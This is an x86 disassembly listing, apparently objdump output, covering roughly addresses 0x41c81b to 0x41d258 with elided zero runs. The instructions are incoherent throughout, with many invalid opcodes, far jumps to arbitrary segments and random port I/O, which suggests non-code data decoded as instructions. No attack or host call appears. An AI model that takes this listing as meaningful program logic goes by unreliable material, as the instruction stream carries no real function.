  41c81b:	adc    eax,0xfb61a45b
  41c820:	mov    esi,0x27d5ec22
  41c825:	jp     0x41c7c5
  41c827:	leave  
  41c828:	les    ebp,FWORD PTR [edx]
  41c82a:	sub    BYTE PTR [ebx-0x43b4e1bf],ah
  41c830:	mov    BYTE PTR [esi],bh
  41c832:	outs   dx,DWORD PTR ds:[esi]
  41c833:	pop    ss
  41c834:	mov    esp,0x607cd19b
  41c839:	jg     0x41c81f
  41c83b:	mov    cl,0x5f
  41c83d:	adc    ebp,DWORD PTR [esi-0x38]
  41c840:	lock int3 
  41c842:	cld    
  41c843:	call   0x407f:0x4d88591c
  41c84a:	ins    DWORD PTR es:[edi],dx
  41c84b:	dec    edx
  41c84c:	(bad)  
  41c84d:	fldenv [ebp+edx*1-0x74]
  41c851:	xlat   BYTE PTR ds:[ebx]
  41c852:	push   0xffffff94
  41c854:	xchg   esp,eax
  41c855:	adc    BYTE PTR [edx-0x1ce2e432],al
  41c85b:	pop    esi
  41c85c:	sbb    ebx,DWORD PTR [esi-0x6f0af12b]
  41c862:	dec    esp
  41c863:	out    0x4d,al
  41c865:	dec    ecx
  41c866:	out    0x12,al
  41c868:	and    bl,BYTE PTR [ecx+ecx*1-0x6e]
  41c86c:	or     ah,bh
  41c86e:	into   
  41c86f:	sub    eax,0x3100b2ff
  41c874:	dec    ebx
  41c875:	pop    esp
  41c876:	or     bh,bh
  41c878:	push   0xffffffc7
  41c87a:	imul   esp,DWORD PTR [ebx],0xafd47571
  41c880:	jp     0x41c8d5
  41c882:	into   
  41c883:	std    
  41c884:	(bad)  
  41c885:	jecxz  0x41c825
  41c887:	loop   0x41c838
  41c889:	adc    BYTE PTR [edx+0x79195ebe],al
  41c88f:	adc    al,0x36
  41c891:	dec    edi
  41c892:	sub    eax,0xac8adc03
  41c897:	fisub  WORD PTR [ebp-0x5d]
  41c89a:	neg    BYTE PTR [ebx-0x12]
  41c89d:	retf   
  41c89e:	sbb    eax,0x207920a2
  41c8a3:	into   
  41c8a4:	shr    DWORD PTR [esi+0x3a],1
  41c8a7:	mov    cl,0x55
  41c8a9:	sbb    bl,dl
  41c8ab:	aaa    
  41c8ac:	es out dx,al
  41c8ae:	ds mov ch,0xbc
  41c8b1:	bound  edi,QWORD PTR [ecx]
  41c8b3:	imul   ebx,DWORD PTR [ecx+0x1ba2db30],0x7f36f065
  41c8bd:	dec    eax
  41c8be:	mov    DWORD PTR [ecx],esi
  41c8c0:	mov    ds:0xe6a01a20,al
  41c8c5:	test   DWORD PTR [edi-0x6d0c1e98],ecx
  41c8cb:	popf   
  41c8cc:	xchg   esi,eax
  41c8cd:	nop
  41c8ce:	pop    eax
  41c8cf:	mov    ebx,0xd90ac6d0
  41c8d5:	add    DWORD PTR [ebx+ecx*2+0x10be6ae1],esi
  41c8dc:	nop
  41c8dd:	imul   edx,esi,0xd7eacec8
  41c8e3:	sti    
  41c8e4:	out    0x3b,eax
  41c8e6:	fdivr  QWORD PTR [esi-0x19]
  41c8e9:	lea    esi,[edi+0x42cc0f]
	...
  41c953:	add    BYTE PTR [eax],al
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	cmc    
  41c963:	mov    dl,0x4d
  41c965:	popf   
  41c966:	xor    eax,DWORD PTR [bx+di]
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    DWORD PTR [eax],eax
  41c96d:	add    BYTE PTR [ebp+0x4e],ah
  41c970:	dec    eax
  41c971:	push   cs
  41c972:	pop    edi
  41c973:	mov    al,0x89
  41c975:	les    eax,FWORD PTR [ecx+0x37]
  41c978:	dec    ebx
  41c979:	(bad)  
  41c97a:	addr16 js 0x41c9f5
  41c97d:	push   ss
  41c97e:	cmp    eax,0x9be42219
  41c983:	jp     0x41c90a
  41c985:	pop    ds
  41c986:	mov    esi,0x3fb8e243
  41c98b:	ja     0x41c91e
  41c98d:	dec    esi
  41c98e:	pop    ebx
  41c98f:	push   cs
  41c990:	and    DWORD PTR [edi-0x7f3b6a31],ecx
  41c996:	inc    esi
  41c997:	mov    al,al
  41c999:	cmp    dh,dh
  41c99b:	jbe    0x41c9fc
  41c99d:	test   al,0xff
  41c99f:	pop    esi
  41c9a0:	ds xor al,0xe3
  41c9a4:	mov    dh,0xd2
  41c9a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a7:	lock les edx,FWORD PTR [ebx+0x4]
  41c9ab:	push   ss
  41c9ac:	pop    esi
  41c9ad:	bound  esp,QWORD PTR [edi+0x329e8f55]
  41c9b3:	and    BYTE PTR [ebx-0x31abe5b9],dl
  41c9b9:	bound  eax,QWORD PTR [ecx-0x7e]
  41c9bc:	(bad)  
  41c9be:	sbb    BYTE PTR [ecx+0x15],bh
  41c9c1:	(bad)  
  41c9c3:	fisubr WORD PTR [esi]
  41c9c5:	jmp    0x1e99:0xd1a48fd
  41c9cc:	pop    ds
  41c9cd:	dec    ebp
  41c9ce:	cmp    eax,0xa13d6050
  41c9d3:	sub    eax,ebx
  41c9d5:	push   ecx
  41c9d6:	inc    esi
  41c9d7:	popa   
  41c9d8:	loopne 0x41c9cb
  41c9da:	pop    ss
  41c9db:	(bad)  
  41c9dc:	sbb    al,0xfc
  41c9de:	mov    ebp,0x77988b8f
  41c9e3:	inc    esp
  41c9e4:	or     DWORD PTR [edx+ebp*1-0x30],esp
  41c9e8:	jo     0x41ca52
  41c9ea:	es jp  0x41ca26
  41c9ed:	jo     0x41c9e8
  41c9ef:	cld    
  41c9f0:	test   al,0x20
  41c9f2:	and    eax,0xee33c50c
  41c9f7:	out    0xd6,al
  41c9f9:	sbb    ah,BYTE PTR [ebp+0x38]
  41c9fc:	mov    DWORD PTR [edx+0x78],eax
  41c9ff:	jl     0x41c9cd
  41ca01:	sub    ecx,esp
  41ca03:	xchg   esp,eax
  41ca04:	mov    ch,0xad
  41ca06:	dec    ecx
  41ca07:	cmp    DWORD PTR ds:0xfd7431ec,0xffffff8f
  41ca0e:	and    DWORD PTR [esi],ecx
  41ca10:	(bad)  
  41ca12:	jmp    0x6d583256
  41ca17:	aad    0x9
  41ca19:	fsubr  DWORD PTR [eax-0x5a5b614f]
  41ca1f:	fs (bad) 
  41ca21:	adc    ebx,DWORD PTR [ebx-0x5c8f151b]
  41ca27:	sub    eax,0x695ea275
  41ca2c:	stos   DWORD PTR es:[edi],eax
  41ca2d:	das    
  41ca2e:	mov    bh,0x7e
  41ca30:	jnp    0x41c9ff
  41ca32:	inc    edi
  41ca33:	mov    dl,BYTE PTR [edi+0x1102bfd5]
  41ca39:	and    BYTE PTR [eax+0x5908c9b7],cl
  41ca3f:	into   
  41ca40:	or     bl,cl
  41ca42:	call   0x8289:0xceb9d5cc
  41ca49:	xchg   esp,eax
  41ca4a:	sub    BYTE PTR ds:0xe6a6ddd4,cl
  41ca50:	loope  0x41c9de
  41ca52:	push   edi
  41ca53:	repnz cmp ah,cl
  41ca56:	mov    ds:0xfbc82d1e,al
  41ca5b:	sbb    bl,BYTE PTR [ecx+0x8]
  41ca5e:	push   eax
  41ca5f:	or     bh,BYTE PTR [eax]
  41ca61:	les    eax,FWORD PTR [edx-0x13]
  41ca64:	call   FWORD PTR [edi-0x685cdce8]
  41ca6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca6b:	xchg   esp,eax
  41ca6c:	cs jp  0x41ca6f
	...
  41cad3:	add    BYTE PTR [eax],al
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	je     0x41cac9
  41cae4:	cs ret 0x3467
  41cae8:	add    DWORD PTR [eax],eax
  41caea:	add    BYTE PTR [ecx],al
  41caec:	add    BYTE PTR [eax],al
  41caee:	xchg   cl,ch
  41caf0:	dec    ebp
  41caf1:	dec    edx
  41caf2:	leave  
  41caf3:	jg     0x41cb59
  41caf5:	inc    ebx
  41caf6:	xlat   BYTE PTR ds:[ebx]
  41caf7:	or     eax,0xd8cf8c57
  41cafc:	xchg   ebx,eax
  41cafd:	cmp    DWORD PTR [edi-0x4],edx
  41cb00:	in     eax,0xc7
  41cb02:	or     dl,ch
  41cb04:	out    0x70,al
  41cb06:	fbld   TBYTE PTR [eax]
  41cb08:	outs   dx,BYTE PTR ds:[esi]
  41cb09:	mov    al,bh
  41cb0b:	xchg   edi,eax
  41cb0c:	inc    edx
  41cb0d:	sbb    eax,0x1e278547
  41cb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb13:	jg     0x41cb10
  41cb15:	push   edi
  41cb16:	inc    esi
  41cb17:	ds popf 
  41cb19:	outs   dx,BYTE PTR ds:[esi]
  41cb1a:	mov    bh,0xa1
  41cb1c:	push   edx
  41cb1d:	mov    ecx,0xeaa877f6
  41cb22:	adc    al,0xe9
  41cb24:	addr16 jae 0x41cab7
  41cb27:	sbb    eax,0xb8e2b47b
  41cb2c:	add    ebp,edx
  41cb2e:	xor    DWORD PTR [ebx],esp
  41cb30:	lahf   
  41cb31:	sbb    esp,DWORD PTR [ecx]
  41cb33:	scas   eax,DWORD PTR es:[edi]
  41cb34:	xlat   BYTE PTR ds:[ebx]
  41cb35:	mov    ds:0x99ebfa95,al
  41cb3a:	imul   edi,DWORD PTR [eax+0x20],0xca756a8b
  41cb41:	add    DWORD PTR [ebp+0x10],ecx
  41cb44:	pusha  
  41cb45:	shr    DWORD PTR [ebx+0x29],1
  41cb48:	push   eax
  41cb49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb4a:	lods   al,BYTE PTR ds:[esi]
  41cb4b:	fild   QWORD PTR [edi]
  41cb4d:	sbb    DWORD PTR [edi+0x761a1aff],0x5715f2c1
  41cb57:	sbb    eax,0x8e49b108
  41cb5c:	jmp    0x2bb4:0x7d06de49
  41cb63:	sbb    BYTE PTR [ebx+0x13],bl
  41cb66:	xor    al,0xb4
  41cb68:	in     eax,0x6
  41cb6a:	jmp    0x41cb6a
  41cb6c:	or     eax,0x6c3900aa
  41cb71:	aam    0x30
  41cb73:	lahf   
  41cb74:	inc    ecx
  41cb75:	into   
  41cb76:	dec    ebp
  41cb77:	stc    
  41cb78:	aad    0x3e
  41cb7a:	and    bh,BYTE PTR [esi]
  41cb7c:	(bad)  
  41cb7d:	mov    esp,0xc6b1016d
  41cb82:	mov    eax,ds:0x8ec6f3d4
  41cb87:	ret    0x57f2
  41cb8a:	js     0x41cba1
  41cb8c:	mov    eax,0x4cfdc674
  41cb91:	mov    WORD PTR [ebp-0x4125a5b9],cs
  41cb97:	loop   0x41cbfe
  41cb99:	sbb    BYTE PTR [edi+edi*1+0x43],bh
  41cb9d:	mov    dl,0x1
  41cb9f:	popf   
  41cba0:	ret    0x7fcf
  41cba3:	ficom  DWORD PTR [edi+0x41422d11]
  41cba9:	xor    eax,DWORD PTR [edi+0x1d]
  41cbac:	mov    ah,0x1d
  41cbae:	dec    ax
  41cbb0:	dec    esi
  41cbb1:	xchg   esi,eax
  41cbb2:	arpl   WORD PTR [esi-0x67],si
  41cbb5:	loop   0x41cbad
  41cbb7:	dec    edi
  41cbb8:	in     eax,0xae
  41cbba:	fdivr  QWORD PTR [edx+0x3809ba8e]
  41cbc0:	(bad)  
  41cbc1:	aad    0xde
  41cbc3:	jne    0x41cb63
  41cbc5:	test   DWORD PTR [edx],ecx
  41cbc7:	sbb    dh,bl
  41cbc9:	call   FWORD PTR [eax+0x4e]
  41cbcc:	xchg   esp,eax
  41cbcd:	jb     0x41cc32
  41cbcf:	inc    eax
  41cbd0:	push   edx
  41cbd1:	sub    cl,BYTE PTR [ebp-0x4b]
  41cbd4:	mov    dh,0xb2
  41cbd6:	jmp    0xe9b:0x18859901
  41cbdd:	push   cs
  41cbde:	push   edx
  41cbdf:	cmp    DWORD PTR [edx+ebp*8-0x3907d3e0],ebx
  41cbe6:	mov    WORD PTR [edi+0x30],ds
  41cbe9:	idiv   DWORD PTR [esi]
  41cbeb:	mov    bl,0x93
  41cbed:	or     eax,DWORD PTR [eax]
	...
  41cc53:	add    BYTE PTR [eax],al
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0xbd670022
  41cc65:	in     eax,dx
  41cc66:	addr16 xor eax,0x1000001
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	jo     0x41cc95
  41cc70:	xlat   BYTE PTR ds:[ebx]
  41cc71:	loopne 0x41cc14
  41cc73:	xchg   edx,eax
  41cc74:	mov    edx,0x6bd95009
  41cc79:	mov    ds:0xa939df09,al
  41cc7e:	hlt    
  41cc7f:	push   esi
  41cc80:	cmp    esp,DWORD PTR [edi]
  41cc82:	int    0x98
  41cc84:	inc    ecx
  41cc85:	int    0xf5
  41cc87:	das    
  41cc88:	push   eax
  41cc89:	(bad)  
  41cc8a:	mov    al,0x90
  41cc8c:	pop    esi
  41cc8d:	sub    esi,DWORD PTR [eax]
  41cc8f:	add    esi,DWORD PTR [edi+0x1d]
  41cc92:	sbb    eax,0x93d30ac0
  41cc97:	and    BYTE PTR [esi],bl
  41cc99:	test   eax,0x6e4ccd71
  41cc9e:	stos   DWORD PTR es:[edi],eax
  41cc9f:	cmc    
  41cca0:	outs   dx,DWORD PTR ds:[esi]
  41cca1:	ins    BYTE PTR es:[edi],dx
  41cca2:	fst    QWORD PTR [eax-0x46ddeec]
  41cca8:	add    eax,0x7b0b9b00
  41ccad:	loope  0x41cceb
  41ccaf:	neg    BYTE PTR [ebp+0x4e]
  41ccb2:	xlat   BYTE PTR ds:[ebx]
  41ccb3:	pop    esi
  41ccb4:	int3   
  41ccb5:	mov    dl,0x62
  41ccb7:	or     DWORD PTR [ebp-0x16],ecx
  41ccba:	and    edi,ebx
  41ccbc:	popa   
  41ccbd:	ret    
  41ccbe:	push   ss
  41ccbf:	sub    ch,BYTE PTR [eax+0xe]
  41ccc2:	pop    ss
  41ccc3:	mov    ch,0x15
  41ccc5:	push   esp
  41ccc6:	aad    0x4f
  41ccc8:	clc    
  41ccc9:	leave  
  41ccca:	test   al,0x16
  41cccc:	lahf   
  41cccd:	jb     0x41cd0e
  41cccf:	enter  0x7a99,0x0
  41ccd3:	(bad)  
  41ccd4:	fmul   st(6),st
  41ccd6:	xor    esi,eax
  41ccd8:	add    esp,esi
  41ccda:	sbb    esp,ecx
  41ccdc:	jmp    0xb056:0x3bd3ff81
  41cce3:	and    DWORD PTR [ebp-0x66],ecx
  41cce6:	jns    0x41ccdb
  41cce8:	push   ds
  41cce9:	inc    eax
  41ccea:	xchg   esi,eax
  41cceb:	sub    al,0xc3
  41cced:	dec    ecx
  41ccee:	add    cl,BYTE PTR [ecx]
  41ccf0:	sbb    ebp,DWORD PTR [eax+0x3e]
  41ccf3:	adc    eax,0xecec62fe
  41ccf8:	mov    BYTE PTR [ebp-0x6a3458ab],0xad
  41ccff:	stc    
  41cd00:	jnp    0x41ccca
  41cd02:	mov    WORD PTR [eax],gs
  41cd04:	and    eax,0x415f93fa
  41cd09:	div    DWORD PTR [ebx]
  41cd0b:	pop    edi
  41cd0c:	mov    esp,0x800d1211
  41cd11:	mov    eax,DWORD PTR [edi-0x25f0ac5b]
  41cd17:	shl    esp,cl
  41cd19:	sub    eax,0xb0c30200
  41cd1e:	adc    ch,BYTE PTR [ecx+0x5]
  41cd21:	mov    WORD PTR [eax+0x44],ax
  41cd25:	cmp    bh,BYTE PTR [ebx]
  41cd27:	xchg   esp,eax
  41cd28:	pop    ebx
  41cd29:	sub    DWORD PTR [eax-0x3b],0x578e6ca5
  41cd30:	xchg   edi,eax
  41cd31:	shl    al,cl
  41cd33:	xor    edx,DWORD PTR ds:0xd5645102
  41cd39:	mov    eax,0xb3830f7
  41cd3e:	mov    esi,0xb1664dcd
  41cd43:	(bad)  
  41cd44:	xchg   ebp,eax
  41cd45:	adc    cl,BYTE PTR [edi-0x28270ed5]
  41cd4b:	repz sbb eax,0xcf60eb27
  41cd51:	xchg   DWORD PTR [esi],ebx
  41cd53:	inc    edx
  41cd54:	jl     0x41cdcf
  41cd56:	jb     0x41cdb2
  41cd58:	test   al,0x73
  41cd5a:	mov    dh,0xcf
  41cd5c:	and    bl,BYTE PTR [ebp+0x67]
  41cd5f:	call   0xd2b:0xac42427d
  41cd66:	xor    DWORD PTR [eax+0x39],0x19735e94
  41cd6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	inc    esi
  41cde3:	call   0x1:0x3667a91f
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	pop    ss
  41cdef:	adc    BYTE PTR [eax],bl
  41cdf1:	sub    ebx,0x79
  41cdf4:	retf   
  41cdf5:	cmp    dh,BYTE PTR [edi+esi*1-0xe]
  41cdf9:	out    dx,eax
  41cdfa:	jnp    0x41cdfd
  41cdfc:	dec    edi
  41cdfd:	mov    edi,0x810eb929
  41ce02:	add    ch,bl
  41ce04:	xor    ecx,DWORD PTR [edx+esi*4+0x77905cfc]
  41ce0b:	pop    esi
  41ce0c:	(bad)
  41ce11:	cmp    DWORD PTR ds:0x50f846f4,esi
  41ce17:	js     0x41ce25
  41ce19:	xor    cl,ch
  41ce1b:	adc    eax,0x85172ea
  41ce20:	xor    al,0xf8
  41ce22:	loope  0x41ce62
  41ce24:	pop    ebp
  41ce25:	xor    BYTE PTR [ebx+edx*1-0x75],cl
  41ce29:	pop    esp
  41ce2a:	in     al,dx
  41ce2b:	out    dx,al
  41ce2c:	mov    edi,0x79825063
  41ce31:	sbb    edi,DWORD PTR [ebx-0xd]
  41ce34:	jg     0x41ce53
  41ce36:	(bad)  [esi+0x18]
  41ce39:	les    ebp,FWORD PTR [edi+0x73f2c14b]
  41ce3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce40:	push   esi
  41ce41:	lods   al,BYTE PTR ds:[esi]
  41ce42:	lahf   
  41ce43:	(bad)  
  41ce45:	es ins BYTE PTR es:[edi],dx
  41ce47:	pop    edi
  41ce48:	and    esp,esp
  41ce4a:	(bad)
  41ce4d:	icebp  
  41ce4e:	inc    ebx
  41ce4f:	and    DWORD PTR [edi],ebp
  41ce51:	and    DWORD PTR [ecx-0x78],0xffffffae
  41ce55:	retf   0x2e70
  41ce58:	fucomp st(6)
  41ce5a:	mov    WORD PTR ds:0x8532b92b,fs
  41ce60:	adc    cl,dh
  41ce62:	mov    dl,0xd1
  41ce64:	mov    esp,0x8d30d2a4
  41ce69:	pop    ss
  41ce6a:	jmp    0xa258:0x1ce9644a
  41ce71:	push   cs
  41ce72:	and    eax,0xa847f0be
  41ce77:	xchg   ebx,eax
  41ce78:	(bad)  
  41ce79:	rcl    BYTE PTR [esi],cl
  41ce7b:	sub    BYTE PTR [ecx-0x24],dl
  41ce7e:	push   ds
  41ce7f:	mov    BYTE PTR [ecx-0x6],dl
  41ce82:	xor    ch,BYTE PTR [ecx+edi*8+0x23]
  41ce86:	(bad)  
  41ce88:	fiadd  DWORD PTR [esi-0x4e15cc4]
  41ce8e:	int3   
  41ce8f:	and    eax,0x20e7eaa4
  41ce94:	rol    DWORD PTR [ebx],0x9d
  41ce97:	div    DWORD PTR [esi-0x19a4949f]
  41ce9d:	jo     0x41ce72
  41ce9f:	icebp  
  41cea0:	mov    DWORD PTR [ebp+0x5b748900],esp
  41cea6:	imul   edx,DWORD PTR ds:0xc3f648d7,0x254e557d
  41ceb0:	push   0xe
  41ceb2:	lock mov dl,0xf0
  41ceb5:	retf   
  41ceb6:	pop    edi
  41ceb7:	mov    BYTE PTR ds:0xa2c8ac75,al
  41cebd:	call   0xc96dabdb
  41cec2:	and    bl,BYTE PTR [eax+0x15]
  41cec5:	push   ebp
  41cec6:	popf   
  41cec7:	sub    eax,0xfbf5f03c
  41cecc:	dec    edi
  41cecd:	gs mov ch,0x29
  41ced0:	icebp  
  41ced1:	ds push edi
  41ced3:	lahf   
  41ced4:	jmp    0x486e:0x95627c81
  41cedb:	mov    WORD PTR [edi-0x62],cs
  41cede:	jmp    0x2ac5:0x1a25
  41cee4:	xchg   esp,eax
  41cee5:	sbb    BYTE PTR [eax+edi*8],dl
  41cee8:	test   bl,0x25
  41ceeb:	rcl    BYTE PTR [ebp+ecx*4+0x0],0x0
	...
  41cf53:	add    BYTE PTR [eax],al
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	cwde   
  41cf63:	push   edi
  41cf64:	adc    DWORD PTR [ecx],0x13767
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	daa    
  41cf6f:	add    ch,BYTE PTR [ebx+0x1d5aa6bc]
  41cf75:	jno    0x41cfd8
  41cf77:	mov    ds:0x32b5caa7,al
  41cf7c:	push   edi
  41cf7d:	or     bh,bl
  41cf7f:	adc    ebx,DWORD PTR [edx+0x31]
  41cf82:	aam    0x97
  41cf84:	fisttp DWORD PTR [eax+ebx*2]
  41cf87:	mov    ds:0x8452b4cb,eax
  41cf8c:	mov    esp,0x484ca191
  41cf91:	cmp    eax,0xe578411
  41cf96:	mov    bl,BYTE PTR [esp+ebx*2-0x7c]
  41cf9a:	call   0x86d:0x5054a45e
  41cfa1:	pop    ebx
  41cfa2:	push   0xffffffe9
  41cfa4:	iret   
  41cfa5:	sub    DWORD PTR [esi],esi
  41cfa7:	inc    eax
  41cfa8:	bnd jl 0x41cfd5
  41cfab:	js     0x41cfa6
  41cfad:	test   DWORD PTR ds:0x8b9c7070,edi
  41cfb3:	push   cs
  41cfb4:	popa   
  41cfb5:	push   ds
  41cfb6:	mov    DWORD PTR [ebx],edi
  41cfb8:	enter  0x68b9,0xc0
  41cfbc:	inc    esi
  41cfbd:	mov    bl,0x3a
  41cfbf:	and    ch,BYTE PTR [edi+0x1d7957ba]
  41cfc5:	pusha  
  41cfc6:	pop    eax
  41cfc7:	jecxz  0x41cf82
  41cfc9:	mov    ds:0xb3961540,eax
  41cfce:	in     al,0x17
  41cfd0:	sbb    esp,esi
  41cfd2:	pop    ebp
  41cfd3:	jecxz  0x41cfce
  41cfd5:	rol    edx,cl
  41cfd7:	les    edi,FWORD PTR [ebx+esi*4]
  41cfda:	jmp    0xd6c96f23
  41cfdf:	rcr    BYTE PTR [ebp-0x3df00332],0xaf
  41cfe6:	mov    edx,0x64b1f49
  41cfeb:	mov    eax,0x37946c59
  41cff0:	add    ebx,DWORD PTR [esi]
  41cff2:	mov    edi,0x7849eec1
  41cff7:	repnz fwait
  41cff9:	hlt    
  41cffa:	lahf   
  41cffb:	repz std 
  41cffd:	jp     0x41d04e
  41cfff:	mov    ch,BYTE PTR [eax+0x21]
  41d002:	xor    edx,DWORD PTR [esi-0x48]
  41d005:	data16 ins BYTE PTR es:[edi],dx
  41d007:	lock outs dx,BYTE PTR ds:[esi]
  41d009:	ins    BYTE PTR es:[edi],dx
  41d00a:	pushf  
  41d00b:	push   ebx
  41d00c:	cmp    ebp,DWORD PTR [edi+0x1b]
  41d00f:	sub    al,0xcf
  41d011:	inc    edi
  41d012:	pop    ebp
  41d013:	mov    esp,0x6442de5a
  41d018:	nop
  41d019:	xor    al,0x4b
  41d01b:	stos   BYTE PTR es:[edi],al
  41d01c:	dec    ebp
  41d01d:	xchg   BYTE PTR [ecx],dh
  41d01f:	mov    ds:0xb4f64bc6,eax
  41d024:	cmp    ecx,esi
  41d026:	sbb    BYTE PTR [ebp-0x1c727321],0xe6
  41d02d:	cdq    
  41d02e:	jb     0x41d03a
  41d030:	push   ebx
  41d031:	(bad)  
  41d032:	dec    ebx
  41d033:	mov    ds:0x70708968,al
  41d038:	inc    ebp
  41d039:	pop    edx
  41d03a:	gs push ebx
  41d03c:	stc    
  41d03d:	inc    edx
  41d03e:	dec    edx
  41d03f:	imul   edx,DWORD PTR [ebx+0x50ed5859],0x9cc2ea88
  41d049:	test   DWORD PTR ds:0xe26fbbab,0x5dcc205e
  41d053:	cmp    eax,0xcc852592
  41d058:	xchg   edi,eax
  41d059:	ror    DWORD PTR ds:0xa3ce693f,cl
  41d05f:	mov    ebx,DWORD PTR [eax+0x1]
  41d062:	mov    ebp,0xd746650d
  41d067:	jne    0x41d0be
  41d069:	ret    
  41d06a:	cs or  eax,0xe8d3
	...
  41d0d4:	add    BYTE PTR [eax],al
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x83a72abd
  41d0e5:	or     ah,BYTE PTR [edi+0x38]
  41d0e8:	add    DWORD PTR [eax],eax
  41d0ea:	add    BYTE PTR [ecx],al
  41d0ec:	add    BYTE PTR [eax],al
  41d0ee:	jp     0x41d0ca
  41d0f0:	add    eax,0x17a08257
  41d0f5:	sbb    eax,0x73b27db3
  41d0fa:	mov    cl,0xb1
  41d0fc:	ror    DWORD PTR [eax],cl
  41d0fe:	mov    ah,0x1e
  41d100:	mov    WORD PTR [eax],ss
  41d102:	nop
  41d103:	xlat   BYTE PTR ds:[ebx]
  41d104:	sub    BYTE PTR [edx],ah
  41d106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d107:	or     eax,0x51227a51
  41d10c:	jae    0x41d15f
  41d10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d10f:	adc    al,BYTE PTR [edx]
  41d111:	sub    al,0x13
  41d113:	cwde   
  41d114:	loopne 0x41d192
  41d116:	pop    esi
  41d117:	xor    eax,0x568f02c6
  41d11c:	mov    ds:0xdcbf1f7d,eax
  41d121:	outs   dx,DWORD PTR ds:[esi]
  41d122:	adc    eax,0xa7d4c1d8
  41d127:	loopne 0x41d0f2
  41d129:	push   ds
  41d12a:	dec    ebx
  41d12b:	jbe    0x41d162
  41d12d:	mov    eax,ds:0xd2c3de52
  41d132:	dec    edx
  41d133:	or     ebp,edi
  41d135:	push   0x59039606
  41d13a:	push   esi
  41d13b:	and    ebp,ebp
  41d13d:	cmp    al,0x7
  41d13f:	mov    al,0xb8
  41d141:	cmp    DWORD PTR [eax-0x77],0x2
  41d145:	mov    ebp,0xa856271
  41d14a:	mov    ds:0x5d22de2f,eax
  41d14f:	push   esi
  41d150:	cs and edi,edx
  41d153:	ja     0x41d105
  41d155:	in     al,dx
  41d156:	loopne 0x41d1a9
  41d158:	pop    ebx
  41d159:	and    cl,BYTE PTR [ebp-0x33a74dfe]
  41d15f:	xchg   edi,eax
  41d160:	ret    0xfaec
  41d163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d164:	aam    0xd2
  41d166:	pushf  
  41d167:	mov    dl,0x1a
  41d169:	mov    bh,0xcf
  41d16b:	call   0xbbe1bdd9
  41d170:	int    0xd
  41d172:	inc    ecx
  41d173:	fcomi  st,st(1)
  41d175:	sub    eax,0x2e947fee
  41d17a:	pop    ebx
  41d17b:	dec    ecx
  41d17c:	sbb    al,0x70
  41d17e:	or     esi,edx
  41d180:	ror    cl,1
  41d182:	daa    
  41d183:	sub    DWORD PTR [ecx+0x52],edx
  41d186:	jbe    0x41d1eb
  41d188:	add    ah,al
  41d18a:	or     al,0x4f
  41d18c:	push   es
  41d18d:	stos   DWORD PTR es:[edi],eax
  41d18e:	and    edx,DWORD PTR [ecx]
  41d190:	fisttp QWORD PTR [ebp+0x25b559f]
  41d196:	and    bl,dl
  41d198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d199:	xchg   edx,eax
  41d19a:	adc    cl,BYTE PTR [edx]
  41d19c:	and    BYTE PTR [edi-0x5beee6bd],al
  41d1a2:	aaa    
  41d1a3:	in     al,0x4
  41d1a5:	arpl   WORD PTR [edi+edx*4-0x38a1df97],dx
  41d1ac:	repz shl BYTE PTR [eax+0x6f7d23cc],cl
  41d1b3:	sub    eax,0x1e5232d0
  41d1b8:	push   esi
  41d1b9:	vandps xmm1,xmm5,XMMWORD PTR [eax+0x25f226ce]
  41d1c1:	into   
  41d1c2:	adc    BYTE PTR [ebp+0x70],dl
  41d1c5:	push   0x457b7717
  41d1ca:	pop    ebx
  41d1cb:	das    
  41d1cc:	pop    esp
  41d1cd:	xchg   DWORD PTR [esp+ebx*8+0x6c],ecx
  41d1d1:	mov    ecx,ecx
  41d1d3:	int3   
  41d1d4:	add    ecx,DWORD PTR [ebp-0x3e]
  41d1d7:	ja     0x41d1c9
  41d1d9:	jmp    ebx
  41d1db:	test   eax,0xadb8319a
  41d1e0:	add    al,0xc3
  41d1e2:	xlat   BYTE PTR ds:[ebx]
  41d1e3:	mov    ah,0xc7
  41d1e6:	xor    DWORD PTR [ebx],esi
  41d1e8:	ja     0x41d1af
  41d1ea:	mov    ch,0x78
  41d1ec:	shl    DWORD PTR [edx+0x0],1
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
